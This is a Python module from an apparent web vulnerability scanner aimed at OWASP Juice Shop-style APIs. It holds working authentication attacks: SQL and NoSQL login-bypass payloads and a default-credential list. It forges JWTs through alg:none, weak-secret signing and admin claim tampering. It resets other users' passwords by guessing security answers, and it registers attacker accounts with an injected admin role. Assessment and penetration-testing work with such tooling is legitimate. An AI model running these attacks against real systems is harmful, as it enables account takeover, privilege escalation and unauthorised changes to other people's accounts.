"""Broken Authentication: SQLi/NoSQL login bypass, JWT weaknesses, default creds, password reset."""
import base64
import hashlib
import hmac
import json
import logging
import re
from typing import Dict, List, Optional
from urllib.parse import urlparse

from core.vuln_types import VT

logger = logging.getLogger(__name__)

class AuthFinding:
    _CATEGORY_MAP = (
        ("SQL Injection in Authentication",   VT.SQL_INJECTION),
        ("NoSQL Injection in Authentication", VT.NOSQL_INJECTION),
        ("Default / Weak Credentials",        VT.DEFAULT_CREDS),
        ("JWT",                               VT.JWT_WEAK),
        ("Weak Password Reset",               VT.WEAK_PASSWORD_RESET),
        ("Mass Assignment",                   VT.MASS_ASSIGNMENT),
        ("Authentication State",              VT.AUTH_STATE_EXPOSURE),
        ("Broken Access Control",             VT.BROKEN_ACCESS_CONTROL),
        ("Broken Authentication",             VT.BROKEN_AUTH),
    )

    def __init__(self, vuln_type, url, parameter, payload, evidence,
                 severity="Critical", confidence=0.9, exploitable=True):
        self.vuln_type = vuln_type
        self.url = url
        self.parameter = parameter
        self.payload = payload
        self.evidence = evidence
        self.severity = severity
        self.confidence = confidence
        self.exploitable = exploitable
        self.category = next((c for p, c in self._CATEGORY_MAP if vuln_type.startswith(p)), "")

    def to_dict(self):
        return {
            "type": self.vuln_type,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "confidence": self.confidence,
            "exploitable": self.exploitable,
            "category": self.category,
        }


class BrokenAuthModule:
    _LOGIN_PATHS = [
        "/rest/user/login",
        "/api/auth/login",
        "/api/v1/auth/login",
        "/api/login",
        "/auth/login",
        "/login",
        "/user/login",
    ]
    _SQLI_PAYLOADS = [
        {"email": "' OR 1=1--", "password": "anything"},
        {"email": "' OR '1'='1'--", "password": "anything"},
        {"email": "admin@juice-sh.op' --", "password": "anything"},
        {"email": "' OR 1=1#", "password": "anything"},
        {"email": "\" OR \"\"=\"", "password": "x"},
        {"email": "a' or 1=1--", "password": "x"},
        {"email": "a@a.com'or'1'='1", "password": "x"},
        {"email": "' OR 1=1 LIMIT 1--", "password": "x"},
        {"email": "admin'/**/OR/**/1=1--", "password": "x"},
    ]
    _NOSQL_PAYLOADS = [
        {"email": {"$gt": ""}, "password": {"$gt": ""}},
        {"email": {"$ne": "invalid@x.com"}, "password": {"$ne": "invalid"}},
        {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"email": "admin@juice-sh.op", "password": {"$gt": ""}},
        {"email": {"$in": ["admin@juice-sh.op"]}, "password": {"$gt": ""}},
    ]
    _DEFAULT_CREDS = [
        ("admin@juice-sh.op", "admin123"),
        ("admin@juice-sh.op", "admin"),
        ("admin@juice-sh.op", "password"),
        ("admin@juice-sh.op", "Admin1!"),
        ("admin@juice-sh.op", "juice"),
        ("admin@example.com", "admin"),
        ("admin", "admin"),
        ("admin", "password"),
        ("test@test.com", "test"),
        ("user@juice-sh.op", "user"),
    ]
    _JWT_WEAK_SECRETS = [
        "secret", "password", "123456", "jwt_secret", "supersecret",
        "juice", "letmein", "qwerty", "", "test", "changeme",
    ]
    _SUCCESS_INDICATORS = ['"token"', '"authentication"', '"accessToken"', '"access_token"']
    _DATA_INDICATORS = ['"data"', '"email"', '"username"', '"id"']

    def __init__(self, http_engine, evasion_engine=None):
        self.http = http_engine
        self._seen: set = set()

    def scan(self, url: str) -> List[AuthFinding]:
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin in self._seen:
            return []
        self._seen.add(origin)

        results: List[AuthFinding] = []
        login_url = self._find_login_url(origin)
        if login_url:
            sqli = self._test_sqli_bypass(login_url)
            results.extend(sqli)
            nosql = self._test_nosql_bypass(login_url)
            results.extend(nosql)
            if not sqli and not nosql:
                results.extend(self._test_default_creds(login_url))

        results.extend(self._test_jwt_weaknesses(origin))
        results.extend(self._test_admin_access(origin))
        results.extend(self._test_password_reset(origin))
        results.extend(self._test_registration_privesc(origin))
        results.extend(self._test_2fa_bypass(origin))
        return results

    def _find_login_url(self, origin: str) -> Optional[str]:
        for path in self._LOGIN_PATHS:
            url = f"{origin}{path}"
            try:
                resp = self.http.post(
                    url,
                    data='{"email":"probe@x.com","password":"probe"}',
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code in (200, 400, 401, 403, 422, 500):
                    return url
            except Exception:
                pass
        return None

    def _is_auth_success(self, text: str) -> bool:
        return any(ind in text for ind in self._SUCCESS_INDICATORS)

    def _test_sqli_bypass(self, login_url: str) -> List[AuthFinding]:
        for payload in self._SQLI_PAYLOADS:
            try:
                resp = self.http.post(
                    login_url,
                    data=json.dumps(payload),
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code == 200 and self._is_auth_success(resp.text):
                    return [AuthFinding(
                        vuln_type="SQL Injection in Authentication (Login Bypass)",
                        url=login_url,
                        parameter="email",
                        payload=json.dumps(payload),
                        evidence=f"Auth bypass via SQLi — {resp.text[:300]}",
                        severity="Critical",
                        confidence=0.98,
                    )]
            except Exception:
                pass
        return []

    def _test_nosql_bypass(self, login_url: str) -> List[AuthFinding]:
        for payload in self._NOSQL_PAYLOADS:
            try:
                resp = self.http.post(
                    login_url,
                    data=json.dumps(payload),
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code == 200 and self._is_auth_success(resp.text):
                    return [AuthFinding(
                        vuln_type="NoSQL Injection in Authentication (Login Bypass)",
                        url=login_url,
                        parameter="email",
                        payload=json.dumps(payload),
                        evidence=f"NoSQL bypass succeeded — {resp.text[:300]}",
                        severity="Critical",
                        confidence=0.97,
                    )]
            except Exception:
                pass
        return []

    def _test_default_creds(self, login_url: str) -> List[AuthFinding]:
        for email, pwd in self._DEFAULT_CREDS:
            try:
                body = json.dumps({"email": email, "password": pwd})
                resp = self.http.post(
                    login_url, data=body,
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code == 200 and self._is_auth_success(resp.text):
                    return [AuthFinding(
                        vuln_type="Default / Weak Credentials",
                        url=login_url,
                        parameter="email,password",
                        payload=body,
                        evidence=f"Login succeeded with {email}:{pwd}",
                        severity="Critical",
                        confidence=0.99,
                    )]
            except Exception:
                pass
        return []

    def _get_token(self, origin: str) -> Optional[str]:
        login_url = self._find_login_url(origin)
        if not login_url:
            return None
        for payload in self._SQLI_PAYLOADS:
            try:
                resp = self.http.post(
                    login_url, data=json.dumps(payload),
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code == 200:
                    data = resp.json()
                    token = ((data.get("authentication") or {}).get("token")
                             or data.get("token") or data.get("accessToken"))
                    if token:
                        return token
            except Exception:
                pass
        return None

    def _forge_alg_none(self, token: str) -> Optional[str]:
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None
            hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            hdr["alg"] = "none"
            new_hdr = base64.urlsafe_b64encode(
                json.dumps(hdr, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            return f"{new_hdr}.{parts[1]}."
        except Exception:
            return None

    def _forge_hs256(self, token: str, secret: str) -> Optional[str]:
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None
            hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            hdr["alg"] = "HS256"
            new_hdr = base64.urlsafe_b64encode(
                json.dumps(hdr, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            msg = f"{new_hdr}.{parts[1]}".encode()
            sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            new_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            return f"{new_hdr}.{parts[1]}.{new_sig}"
        except Exception:
            return None

    def _test_jwt_weaknesses(self, origin: str) -> List[AuthFinding]:
        results: List[AuthFinding] = []
        token = self._get_token(origin)
        if not token:
            return results

        probe_paths = ["/api/Users", "/api/Users/1", "/api/Feedbacks",
                       "/api/Challenges", "/rest/user/whoami"]

        forged_none = self._forge_alg_none(token)
        if forged_none:
            for path in probe_paths:
                try:
                    resp = self.http.get(
                        f"{origin}{path}",
                        headers={"Authorization": f"Bearer {forged_none}"},
                    )
                    if resp and resp.status_code == 200 and any(i in resp.text for i in self._DATA_INDICATORS):
                        results.append(AuthFinding(
                            vuln_type="JWT Algorithm Confusion (alg:none Bypass)",
                            url=f"{origin}{path}",
                            parameter="Authorization",
                            payload=forged_none[:120] + "...",
                            evidence=f"JWT alg=none accepted → {resp.text[:250]}",
                            severity="Critical",
                            confidence=0.97,
                        ))
                        break
                except Exception:
                    pass

        for secret in self._JWT_WEAK_SECRETS:
            forged = self._forge_hs256(token, secret)
            if not forged:
                continue
            try:
                resp = self.http.get(
                    f"{origin}/api/Users/1",
                    headers={"Authorization": f"Bearer {forged}"},
                )
                if resp and resp.status_code == 200 and any(i in resp.text for i in self._DATA_INDICATORS):
                    results.append(AuthFinding(
                        vuln_type="JWT Weak Signing Secret (Forgeable Token)",
                        url=f"{origin}/api/Users/1",
                        parameter="Authorization",
                        payload=f"secret={secret!r}",
                        evidence=f"Forged JWT with secret={secret!r} accepted",
                        severity="Critical",
                        confidence=0.95,
                    ))
                    break
            except Exception:
                pass

        # Test admin token claims manipulation (change role/isAdmin in payload)
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload_decoded = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                payload_decoded["data"] = payload_decoded.get("data", {})
                if isinstance(payload_decoded.get("data"), dict):
                    payload_decoded["data"]["role"] = "admin"
                    payload_decoded["data"]["isAdmin"] = True
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(payload_decoded, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                forged_admin = f"{parts[0]}.{new_payload}."
                resp = self.http.get(
                    f"{origin}/api/Users",
                    headers={"Authorization": f"Bearer {forged_admin}"},
                )
                if resp and resp.status_code == 200 and '"data"' in resp.text:
                    results.append(AuthFinding(
                        vuln_type="JWT Privilege Escalation (Claims Manipulation)",
                        url=f"{origin}/api/Users",
                        parameter="Authorization",
                        payload=forged_admin[:120] + "...",
                        evidence=f"Admin access with manipulated JWT claims → {resp.text[:200]}",
                        severity="Critical",
                        confidence=0.90,
                    ))
        except Exception:
            pass

        return results

    def _test_admin_access(self, origin: str) -> List[AuthFinding]:
        results: List[AuthFinding] = []
        endpoints = [
            ("/api/Users",          "User list (may include password hashes)"),
            ("/api/Feedbacks",      "All user feedback"),
            ("/api/Complaints",     "All user complaints"),
            ("/api/Challenges",     "Challenge/score board data"),
            ("/api/Recycles",       "Recycle data"),
            ("/api/Quantitys",      "Inventory quantities"),
            ("/rest/admin/application-version", "App version info"),
            ("/rest/admin/application-configuration", "App configuration"),
        ]
        for path, desc in endpoints:
            try:
                resp = self.http.get(f"{origin}{path}")
                if resp and resp.status_code == 200:
                    if any(i in resp.text for i in self._DATA_INDICATORS):
                        results.append(AuthFinding(
                            vuln_type="Broken Access Control (Unauthenticated API Access)",
                            url=f"{origin}{path}",
                            parameter="-",
                            payload=f"GET {path}",
                            evidence=f"{desc} → HTTP 200 → {resp.text[:200]}",
                            severity="High",
                            confidence=0.92,
                        ))
            except Exception:
                pass
        return results

    def _test_password_reset(self, origin: str) -> List[AuthFinding]:
        reset_paths = ["/rest/user/reset-password", "/api/auth/reset-password"]
        # Juice Shop security question answers are intentionally weak
        test_cases = [
            ("admin@juice-sh.op",     ["Samuel", "samuel", "samuel L. Jackson", "x", "cats", "dog"]),
            ("jim@juice-sh.op",       ["Samuel", "JAI ALAI", "Jai Alai", "tennis"]),
            ("bjoern@juice-sh.op",    ["west", "sausage", "Zaya", "zaya"]),
            ("wurstbrot@juice-sh.op", ["west", "Bro", "bro"]),
        ]
        for path in reset_paths:
            for email, answers in test_cases:
                for answer in answers:
                    try:
                        body = json.dumps({
                            "email": email,
                            "answer": answer,
                            "new": "NewP@ssw0rd123!",
                            "repeat": "NewP@ssw0rd123!"
                        })
                        resp = self.http.post(
                            f"{origin}{path}", data=body,
                            headers={"Content-Type": "application/json"},
                        )
                        if resp and resp.status_code == 200:
                            return [AuthFinding(
                                vuln_type="Weak Password Reset Mechanism (Security Question Bypass)",
                                url=f"{origin}{path}",
                                parameter="answer",
                                payload=body,
                                evidence=f"Password reset for {email} succeeded with answer={answer!r}",
                                severity="High",
                                confidence=0.93,
                            )]
                    except Exception:
                        pass
        return []

    def _test_registration_privesc(self, origin: str) -> List[AuthFinding]:
        reg_paths = ["/api/Users"]
        for path in reg_paths:
            try:
                import random, string
                suffix = "".join(random.choices(string.ascii_lowercase, k=6))
                body = json.dumps({
                    "email": f"attacker_{suffix}@evil.com",
                    "password": "Attack1!Test",
                    "passwordRepeat": "Attack1!Test",
                    "role": "admin",
                    "securityQuestion": {"id": 1, "question": "x",
                                         "createdAt": "2020-01-01", "updatedAt": "2020-01-01"},
                    "securityAnswer": "x",
                })
                resp = self.http.post(
                    f"{origin}{path}", data=body,
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code in (200, 201):
                    try:
                        data = resp.json()
                        if (data.get("data") or {}).get("role") == "admin":
                            return [AuthFinding(
                                vuln_type="Mass Assignment (Admin Role via Registration)",
                                url=f"{origin}{path}",
                                parameter="role",
                                payload='{"role":"admin"}',
                                evidence=f"Registration returned role=admin → {resp.text[:200]}",
                                severity="Critical",
                                confidence=0.97,
                            )]
                    except Exception:
                        pass
            except Exception:
                pass
        return []

    def _test_2fa_bypass(self, origin: str) -> List[AuthFinding]:
        results: List[AuthFinding] = []
        # Test if 2FA can be bypassed via direct API calls
        try:
            resp = self.http.get(f"{origin}/rest/user/whoami")
            if resp and resp.status_code == 200 and '"email"' in resp.text:
                results.append(AuthFinding(
                    vuln_type="Authentication State Exposure (Unauthenticated WhoAmI)",
                    url=f"{origin}/rest/user/whoami",
                    parameter="-",
                    payload="GET /rest/user/whoami",
                    evidence=f"User info exposed without auth → {resp.text[:150]}",
                    severity="Medium",
                    confidence=0.88,
                    exploitable=False,
                ))
        except Exception:
            pass
        return results
